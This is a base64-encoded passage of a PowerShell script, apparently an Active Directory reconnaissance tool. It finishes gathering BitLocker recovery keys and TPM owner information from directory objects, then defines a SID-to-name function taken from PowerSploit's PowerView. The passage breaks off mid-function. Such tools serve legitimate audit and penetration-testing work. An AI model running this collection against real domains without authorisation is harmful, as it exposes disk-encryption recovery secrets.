ICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUUE1SZWNvdmVyeUluZm8gPSAkbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUUE1PYmplY3QgPSAoW0FEU0ldIkxEQVA6Ly8kKCRUZW1wQ29tcC5Qcm9wZXJ0aWVzLidtc3RwbS10cG1pbmZvcm1hdGlvbmZvcmNvbXB1dGVyJykiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYXRjaAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmICgkVFBNT2JqZWN0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRQTVJlY292ZXJ5SW5mbyA9ICQoW3N0cmluZ10gJFRQTU9iamVjdC5Qcm9wZXJ0aWVzLidtc3RwbS1vd25lcmluZm9ybWF0aW9uJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRQTVJlY292ZXJ5SW5mbyA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAibXNUUE0tT3duZXJJbmZvcm1hdGlvbiIgLVZhbHVlICRudWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAibXNUUE0tVHBtSW5mb3JtYXRpb25Gb3JDb21wdXRlciIgLVZhbHVlICRudWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRUUE1SZWNvdmVyeUluZm8gPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlRQTSBPd25lciBQYXNzd29yZCIgLVZhbHVlICRUUE1SZWNvdmVyeUluZm8KICAgICAgICAgICAgICAgICAgICAkQml0TG9ja2VyT2JqICs9ICRPYmoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgY250CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREJpdExvY2tlclJlY292ZXJ5S2V5cwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJEJpdExvY2tlck9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJEJpdExvY2tlck9iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgojIE1vZGlmaWVkIENvbnZlcnRGcm9tLVNJRCBmdW5jdGlvbiBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvYmxvYi9kZXYvUmVjb24vUG93ZXJWaWV3LnBzMQpGdW5jdGlvbiBDb252ZXJ0RnJvbS1TSUQKewo8IwouU1lOT1BTSVMKICAgIENvbnZlcnRzIGEgc2VjdXJpdHkgaWRlbnRpZmllciAoU0lEKSB0byBhIGdyb3VwL3VzZXIgbmFtZS4KCiAgICBBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkKICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQoKLkRFU0NSSVBUSU9OCiAgICBDb252ZXJ0cyBhIHNlY3VyaXR5IGlkZW50aWZpZXIgc3RyaW5nIChTSUQpIHRvIGEgZ3JvdXAvdXNlciBuYW1lIHVzaW5nIElBRHNOYW1lVHJhbnNsYXRlIGludGVyZmFjZS4KCi5QQVJBTUVURVIgUHJvdG9jb2wKICAgIFtzdHJpbmddCiAgICBXaGljaCBwcm90b2NvbCB0byB1c2U7IEFEV1MgKGRlZmF1bHQpIG9yIExEQVAuCgouUEFSQU1FVEVSIE9iamVjdFNpZAogICAgU3BlY2lmaWVzIG9uZSBvciBtb3JlIFNJRHMgdG8gY29udmVydC4KCi5QQVJBTUVURVIgRG9tYWluRlFETgogICAgU3BlY2lmaWVzIHRoZSBGUUROIG9mIHRoZSBEb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKICAgIFNwZWNpZmllcyBhbiBhbHRlcm5hdGUgY3JlZGVudGlhbCB0byB1c2UgZm9yIHRoZSB0cmFuc2xhdGlvbi4KCi5QQVJBTUVURVIgUmVzb2x2ZVNJRHMKICAgIFtib29sXQogICAgV2hldGhlciB0byByZXNvbHZlIFNJRHMgaW4gdGhlIEFDTHMgbW9kdWxlLiAoRGVmYXVsdCBGYWxzZSkKCi5FWEFNUExFCgogICAgQ29udmVydEZyb20tU0lEIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOAoKICAgIFRFU1RMQUJcaGFybWoweQoKLkVYQU1QTEUKCiAgICAiUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA3IiwgIlMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCIsICJTLTEtNS0zMi01NjIiIHwgQ29udmVydEZyb20tU0lECgogICAgVEVTVExBQlxXSU5ET1dTMiQKICAgIFRFU1RMQUJcaGFybWoweQogICAgQlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnMKCi5FWEFNUExFCgogICAgJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiAgICAkQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtJywgJFNlY1Bhc3N3b3JkKQogICAgQ29udmVydEZyb20tU0lEIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCAtQ3JlZGVudGlhbCAkQ3JlZAoKICAgIFRFU1RMQUJcaGFybWoweQoKLklOUFVUUwogICAgW1N0cmluZ10KICAgIEFjY2VwdHMgb25lIG9yIG1vcmUgU0lEIHN0cmluZ3Mgb24gdGhlIHBpcGVsaW5lLgoKLk9VVFBVVFMKICAgIFtTdHJpbmddCiAgICBUaGUgY29udmVydGVkIERPTUFJTlx1c2VybmFtZS4KIz4KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0FsaWFzKCdTSUQnKV0KICAgICAgICAjW1ZhbGlkYXRlUGF0dGVybignXlMtMS0uKicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE9iamVjdFNpZCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtzdHJpbmddICREb21haW5GUUROLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtib29sXSAkUmVzb2x2ZVNJRCA9ICRmYWxzZQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAjIE5hbWUgVHJhbnNsYXRvciBJbml0aWFsaXphdGlvbiBUeXBlcwogICAgICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9hYTc3MjI2NiUyOHY9dnMuODUlMjkuYXNweAogICAgICAgICRBRFNfTkFNRV9JTklUVFlQRV9ET01BSU4gICA9IDEgIyBJbml0aWFsaXplcyBhIE5hbWVUcmFuc2xhdGUgb2JqZWN0IGJ5IHNldHRpbmcgdGhlIGRvbWFpbiB0aGF0IHRoZSBvYmplY3QgYmluZHMgdG8uCiAgICAgICAgIyRBRFNfTkFNRV9JTklUVFlQRV9TRVJWRVIgICA9IDIgIyBJbml0aWFsaXplcyBhIE5hbWVUcmFuc2xhdGUgb2JqZWN0IGJ5IHNldHRpbmcgdGhlIHNlcnZlciB0aGF0IHRoZSBvYmplY3QgYmluZHMgdG8uCiAgICAgICAgJEFEU19OQU1FX0lOSVRUWVBFX0dDICAgICAgID0gMyAjIEluaXRpYWxpemVzIGEgTmFtZVRyYW5zbGF0ZSBvYmplY3QgYnkgbG9jYXRpbmcgdGhlIGdsb2JhbCBjYXRhbG9nIHRoYXQgdGhlIG9iamVjdCBiaW5kcyB0by4KCiAgICAgICAgIyBOYW1lIFRyYW5zYXRvciBOYW1lIFR5cGVzCiAgICAgICAgIyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2FhNzcyMjY3JTI4dj12cy44NSUyOS5hc3B4CiAgICAgICAgIyRBRFNfTkFNRV9UWVBFXzE3NzkgICAgICAgICAgICAgICAgICAgICA9IDEgIyBOYW1lIGZvcm1hdCBhcyBzcGVjaWZpZWQgaW4gUkZDIDE3NzkuIEZvciBleGFtcGxlLCAiQ049SmVmZiBTbWl0aCxDTj11c2VycyxEQz1GYWJyaWthbSxEQz1jb20iLgogICAgICAgICMkQURTX05BTUVfVFlQRV9DQU5PTklDQUwgICAgICAgICAgICAgICAgPSAyICMgQ2Fub25pY2FsIG5hbWUgZm9ybWF0LiBGb3IgZXhhbXBsZSwgIkZhYnJpa2FtLmNvbS9Vc2Vycy9KZWZmIFNtaXRoIi4KICAgICAgICAkQURTX05BTUVfVFlQRV9OVDQgICAgICAgICAgICAgICAgICAgICAgPSAzICMgQWNjb3VudCBuYW1lIGZvcm1hdCB1c2VkIGluIFdpbmRvd3MuIEZvciBleGFtcGxlLCAiRmFicmlrYW1cSmVmZlNtaXRoIi4KICAgICAgICAjJEFEU19OQU1FX1RZUEVfRElTUExBWSAgICAgICAgICAgICAgICAgID0gNCAjIERpc3BsYXkgbmFtZSBmb3JtYXQuIEZvciBleGFtcGxlLCAiSmVmZiBTbWl0aCIuCiAgICAgICAgIyRBRFNfTkFNRV9UWVBFX0RPTUFJTl9TSU1QTEUgICAgICAgICAgICA9IDUgIyBTaW1wbGUgZG9tYWluIG5hbWUgZm9ybWF0LiBGb3IgZXhhbXBsZSwgIkplZmZTbWl0aEBGYWJyaWthbS5jb20iLgogICAgICAgICMkQURTX05BTUVfVFlQRV9FTlRFUlBSSVNFX1NJTVBMRSAgICAgICAgPSA2ICMgU2ltcGxlIGVudGVycHJpc2UgbmFtZSBmb3JtYXQuIEZvciBleGFtcGxlLCAiSmVmZlNtaXRoQEZhYnJpa2FtLmNvbSIuCiAgICAgICAgIyRBRFNfTkFNRV9UWVBFX0dVSUQgICAgICAgICAgICAgICAgICAgICA9IDcgIyBHbG9iYWwgVW5pcXVlIElkZW50aWZpZXIgZm9ybWF0LiBGb3IgZXhhbXBsZSwgIns5NWVlOWZmZi0zNDM2LTExZDEtYjJiMC1kMTVhZTNhYzg0MzZ9Ii4KICAgICAgICAkQURTX05BTUVfVFlQRV9VTktOT1dOICAgICAgICAgICAgICAgICAgPSA4ICMgVW5rbm93biBuYW1lIHR5cGUuIFRoZSBzeXN0ZW0gd2lsbCBlc3RpbWF0ZSB0aGUgZm9ybWF0LiBUaGlzIGVsZW1lbnQgaXMgYSBtZWFuaW5nZnVsIG9wdGlvbiBvbmx5IHdpdGggdGhlIElBRHNOYW1lVHJhbnNsYXRlLlNldCBvciB0aGUgSUFEc05hbWVUcmFuc2xhdGUuU2V0RXggbWV0aG9kLCBidXQgbm90IHdpdGggdGhlIElBRHNOYW1lVHJhbnNsYXRlLkdldCBvciBJQURzTmFtZVRyYW5zbGF0ZS5HZXRFeCBtZXRob2QuCiAgICAgICAgIyRBRFNfTkFNRV9UWVBFX1VTRVJfUFJJTkNJUEFMX05BTUUgICAgICA9IDkgIyBVc2VyIHByaW5jaXBhbCBuYW1lIGZvcm1hdC4gRm9yIGV4YW1wbGUsICJKZWZmU21pdGhARmFicmlrYW0uY29tIi4KICAgICAgICAjJEFEU19OQU1FX1RZUEVfQ0FOT05JQ0FMX0VYICAgICAgICAgICAgID0gMTAgIyBFeHRlbmRlZCBjYW5vbmljYWwgbmFtZSBmb3JtYXQuIEZvciBleGFtcGxlLCAiRmFicmlrYW0uY29tL1VzZXJzIEplZmYgU21pdGgiLgogICAgICAgICMkQURTX05BTUVfVFlQRV9TRVJWSUNFX1BSSU5DSVBBTF9OQU1FICAgPSAxMSAjIFNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgZm9ybWF0LiBGb3IgZXhhbXBsZSwgInd3dy93d3cuZmFicmlrYW0uY29tQGZhYnJpa2FtLmNvbSIuCiAgICAgICAgIyRBRFNfTkFNRV9UWVBFX1NJRF9PUl9TSURfSElTVE9SWV9OQU1FICA9IDEyICMgQSBTSUQgc3RyaW5nLCBhcyBkZWZpbmVkIGluIHRoZSBTZWN1cml0eSBEZXNjcmlwdG9yIERlZmluaXRpb24gTGFuZ3VhZ2UgKFNEREwpLCBmb3IgZWl0aGVyIHRoZSBTSUQgb2YgdGhlIGN1cnJlbnQgb2JqZWN0IG9yIG9uZSBmcm9tIHRoZSBvYmplY3QgU0lEIGhpc3RvcnkuIEZvciBleGFtcGxlLCAiTzpBT0c6REFEOihBOztSUFdQQ0NEQ0xDU1dSQ1dEV09HQTs7O1MtMS0wLTApIgoKICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvYWE3NzIyNTAuYXNweAogICAgICAgICMkQURTX0NIQVNFX1JFRkVSUkFMU19ORVZFUiAgICAgICA9ICgweDAwKSAjIFRoZSBjbGllbnQgc2hvdWxkIG5ldmVyIGNoYXNlIHRoZSByZWZlcnJlZC10byBzZXJ2ZXIuIFNldHRpbmcgdGhpcyBvcHRpb24gcHJldmVudHMgYSBjbGllbnQgZnJvbSBjb250YWN0aW5nIG90aGVyIHNlcnZlcnMgaW4gYSByZWZlcnJhbCBwcm9jZXNzLgogICAgICAgICMkQURTX0NIQVNFX1JFRkVSUkFMU19TVUJPUkRJTkFURSA9ICgweDIwKSAjIFRoZSBjbGllbnQgY2hhc2VzIG9ubHkgc3Vib3JkaW5hdGUgcmVmZXJyYWxzIHdoaWNoIGFyZSBhIHN1Ym9yZGluYXRlIG5hbWluZyBjb250ZXh0IGluIGEgZGlyZWN0b3J5IHRyZWUuIEZvciBleGFtcGxlLCBpZiB0aGUgYmFzZSBzZWFyY2ggaXMgcmVxdWVzdGVkIGZvciAiREM9RmFicmlrYW0sREM9Q29tIiwgYW5kIHRoZSBzZXJ2ZXIgcmV0dXJucyBhIHJlc3VsdCBzZXQgYW5kIGEgcmVmZXJyYWwgb2YgIkRDPVNhbGVzLERDPUZhYnJpa2FtLERDPUNvbSIgb24gdGhlIEFkYlNhbGVzIHNlcnZlciwgdGhlIGNsaWVudCBjYW4gY29udGFjdCB0aGUgQWRiU2FsZXMgc2VydmVyIHRvIGNvbnRpbnVlIHRoZSBzZWFyY2guIFRoZSBBRFNJIExEQVAgcHJvdmlkZXIgYWx3YXlzIHR1cm5zIG9mZiB0aGlzIGZsYWcgZm9yIHBhZ2VkIHNlYXJjaGVzLgogICAgICAgICMkQURTX0NIQVNFX1JFRkVSUkFMU19FWFRFUk5BTCAgICA9ICgweDQwKSAjIFRoZSBjbGllbnQgY2hhc2VzIGV4dGVybmFsIHJlZmVycmFscy4gRm9yIGV4YW1wbGUsIGEgY2xpZW50IHJlcXVlc3RzIHNlcnZlciBBIHRvIHBlcmZvcm0gYSBzZWFyY2ggZm9yICJEQz1GYWJyaWthbSxEQz1Db20iLiBIb3dldmVyLCBzZXJ2ZXIgQSBkb2VzIG5vdCBjb250YWluIHRoZSBvYmplY3QsIGJ1dCBrbm93cyB0aGF0IGFuIGluZGVwZW5kZW50IHNlcnZlciwgQiwgb3ducyBpdC4gSXQgdGhlbiByZWZlcnMgdGhlIGNsaWVudCB0byBzZXJ2ZXIgQi4KICAgICAgICAkQURTX0NIQVNFX1JFRkVSUkFMU19BTFdBWVMgICAgICA9ICgweDYwKSAjIFJlZmVycmFscyBhcmUgY2hhc2VkIGZvciBlaXRoZXIgdGhlIHN1Ym9yZGluYXRlIG9yIGV4dGVybmFsIHR5cGUuCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgJFRhcmdldFNpZCA9ICQoJE9iamVjdFNpZC5UcmltU3RhcnQoIk86IikpCiAgICAgICAgJFRhcmdldFNpZCA9ICQoJFRhcmdldFNpZC5UcmltKCcqJykpCiAgICAgICAgSWYgKCRUYXJnZXRTaWQgLW1hdGNoICdeUy0xLS4qJykKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIHRyeSB0byByZXNvbHZlIGFueSBidWlsdC1pbiBTSURzIGZpcnN0IC0gaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMva2IvMjQzMzMwCiAgICAgICAgICAgICAgICBTd2l0Y2ggKCRUYXJnZXRTaWQpIHsKICAgICAgICAgICAgICAgICAgICAnUy0xLTAnICAgICAgICAgeyAnTnVsbCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTAtMCcgICAgICAgeyAnTm9ib2R5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0xJyAgICAgICAgIHsgJ1dvcmxkIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMS0wJyAgICAgICB7ICdFdmVyeW9uZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMicgICAgICAgICB7ICdMb2NhbCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTItMCcgICAgICAgeyAnTG9jYWwnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTItMScgICAgICAgeyAnQ29uc29sZSBMb2dvbiAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMnICAgICAgICAgeyAnQ3JlYXRvciBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMCcgICAgICAgeyAnQ3JlYXRvciBPd25lcicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy0xJyAgICAgICB7ICdDcmVhdG9yIEdyb3VwJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTInICAgICAgIHsgJ0NyZWF0b3IgT3duZXIgU2VydmVyJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTMnICAgICAgIHsgJ0NyZWF0b3IgR3JvdXAgU2VydmVyJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTQnICAgICAgIHsgJ093bmVyIFJpZ2h0cycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNCcgICAgICAgICB7ICdOb24tdW5pcXVlIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNScgICAgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMScgICAgICAgeyAnRGlhbHVwJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTInICAgICAgIHsgJ05ldHdvcmsnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMycgICAgICAgeyAnQmF0Y2gnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtNCcgICAgICAgeyAnSW50ZXJhY3RpdmUnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtNicgICAgICAgeyAnU2VydmljZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS03JyAgICAgICB7ICdBbm9ueW1vdXMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtOCcgICAgICAgeyAnUHJveHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtOScgICAgICAgeyAnRW50ZXJwcmlzZSBEb21haW4gQ29udHJvbGxlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTAnICAgICAgeyAnUHJpbmNpcGFsIFNlbGYnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTEnICAgICAgeyAnQXV0aGVudGljYXRlZCBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMicgICAgICB7ICdSZXN0cmljdGVkIENvZGUnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTMnICAgICAgeyAnVGVybWluYWwgU2VydmVyIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE0JyAgICAgIHsgJ1JlbW90ZSBJbnRlcmFjdGl2ZSBMb2dvbicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xNScgICAgICB7ICdUaGlzIE9yZ2FuaXphdGlvbiAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTcnICAgICAgeyAnVGhpcyBPcmdhbml6YXRpb24gJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE4JyAgICAgIHsgJ0xvY2FsIFN5c3RlbScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xOScgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMjAnICAgICAgeyAnTlQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTgwLTAnICAgIHsgJ0FsbCBTZXJ2aWNlcyAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ0JyAgeyAnQlVJTFRJTlxBZG1pbmlzdHJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDUnICB7ICdCVUlMVElOXFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NicgIHsgJ0JVSUxUSU5cR3Vlc3RzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NycgIHsgJ0JVSUxUSU5cUG93ZXIgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ4JyAgeyAnQlVJTFRJTlxBY2NvdW50IE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDknICB7ICdCVUlMVElOXFNlcnZlciBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTUwJyAgeyAnQlVJTFRJTlxQcmludCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTUxJyAgeyAnQlVJTFRJTlxCYWNrdXAgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1MicgIHsgJ0JVSUxUSU5cUmVwbGljYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU0JyAgeyAnQlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NScgIHsgJ0JVSUxUSU5cUmVtb3RlIERlc2t0b3AgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU2JyAgeyAnQlVJTFRJTlxOZXR3b3JrIENvbmZpZ3VyYXRpb24gT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1NycgIHsgJ0JVSUxUSU5cSW5jb21pbmcgRm9yZXN0IFRydXN0IEJ1aWxkZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1OCcgIHsgJ0JVSUxUSU5cUGVyZm9ybWFuY2UgTW9uaXRvciBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTknICB7ICdCVUlMVElOXFBlcmZvcm1hbmNlIExvZyBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjAnICB7ICdCVUlMVElOXFdpbmRvd3MgQXV0aG9yaXphdGlvbiBBY2Nlc3MgR3JvdXAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTYxJyAgeyAnQlVJTFRJTlxUZXJtaW5hbCBTZXJ2ZXIgTGljZW5zZSBTZXJ2ZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2MicgIHsgJ0JVSUxUSU5cRGlzdHJpYnV0ZWQgQ09NIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2OScgIHsgJ0JVSUxUSU5cQ3J5cHRvZ3JhcGhpYyBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTczJyAgeyAnQlVJTFRJTlxFdmVudCBMb2cgUmVhZGVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzQnICB7ICdCVUlMVElOXENlcnRpZmljYXRlIFNlcnZpY2UgRENPTSBBY2Nlc3MnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc1JyAgeyAnQlVJTFRJTlxSRFMgUmVtb3RlIEFjY2VzcyBTZXJ2ZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NicgIHsgJ0JVSUxUSU5cUkRTIEVuZHBvaW50IFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc3JyAgeyAnQlVJTFRJTlxSRFMgTWFuYWdlbWVudCBTZXJ2ZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3OCcgIHsgJ0JVSUxUSU5cSHlwZXItViBBZG1pbmlzdHJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzknICB7ICdCVUlMVElOXEFjY2VzcyBDb250cm9sIEFzc2lzdGFuY2UgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU4MCcgIHsgJ0JVSUxUSU5cUmVtb3RlIE1hbmFnZW1lbnQgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICBEZWZhdWx0IHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBiYXNlZCBvbiBDb252ZXJ0LUFETmFtZSBmdW5jdGlvbiBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvYmxvYi9kZXYvUmVjb24vUG93ZXJWaWV3LnBzMQogICAgICAgICAgICAgICAgICAgICAgICBJZiAoICgkVGFyZ2V0U2lkIC1tYXRjaCAnXlMtMS0uKicpIC1hbmQgKCRSZXNvbHZlU0lEKSApCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRE9iamVjdCA9IEdldC1BRE9iamVjdCAtRmlsdGVyICJvYmplY3RTaWQgLWVxICckVGFyZ2V0U2lkJyIgLVByb3BlcnRpZXMgRGlzdGluZ3Vpc2hlZE5hbWUsc0FNQWNjb3VudE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdya